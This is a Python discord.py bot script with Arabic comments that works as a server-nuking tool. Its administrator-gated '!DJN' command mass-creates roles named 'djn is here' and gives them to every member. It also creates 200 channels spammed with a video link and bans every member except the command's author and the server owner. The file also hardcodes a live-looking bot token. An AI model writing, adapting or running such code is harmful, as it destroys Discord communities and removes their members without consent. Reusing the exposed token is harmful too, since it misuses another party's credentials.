import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# رابط الفيديو الخاص بك
VIDEO_URL = "https://cdn.discordapp.com/attachments/1498407381065793593/1514763422644965426/B6C171BA-FD83-4288-8120-86BD67729CF5.mov?ex=6a2c8cde&is=6a2b3b5e&hm=4ba85f0b39075d0287849b5090497a0a5365bc58a7bae3530d3f1445a34d4709&"

@bot.event
async def on_ready():
    print(f"تم تشغيل البوت بنجاح: {bot.user.name}")

@bot.command(name="DJN")
@commands.has_permissions(administrator=True)
async def djn_all_in_one(ctx):
    guild = ctx.guild
    author = ctx.author
    owner = guild.owner
    
    # 1. انشاء 10 رتب واعطائها للكل فوراً
    print("جاري انشاء الرتب وتوزيعها...")
    roles = []
    for i in range(10):
        try:
            role = await guild.create_role(name="djn is here", color=discord.Color.red())
            roles.append(role)
        except:
            pass
            
    for member in guild.members:
        if not member.bot and member != author and member != owner:
            try:
                await member.add_roles(*roles)
            except:
                pass

    # 2. انشاء 200 روم وارسال الفيديو داخلها بشكل متوازي وسريع
    print("جاري انشاء 200 روم وارسال الفيديو...")
    for i in range(200):
        try:
            channel = await guild.create_text_channel(name=f"djn-{i+1}")
            asyncio.create_task(channel.send(VIDEO_URL))
        except Exception as e:
            print(f"خطا في انشاء الروم: {e}")
            break

    # 3. تبنيد الجميع (باستثناء صاحب الامر والاونر)
    print("جاري تبنيد الكل...")
    for member in guild.members:
        if not member.bot and member != author and member != owner:
            try:
                await member.ban(reason="djn is here")
            except:
                pass

# التوكن الخاص بك تم وضعه هنا تلقائياً
bot.run("MTUxNDc2MjI0Njk5NDEzNzE2OQ.GHN4zX.s51dC8WfooLODtyKq4cnXwTOqliIiAoQNAMMoU")
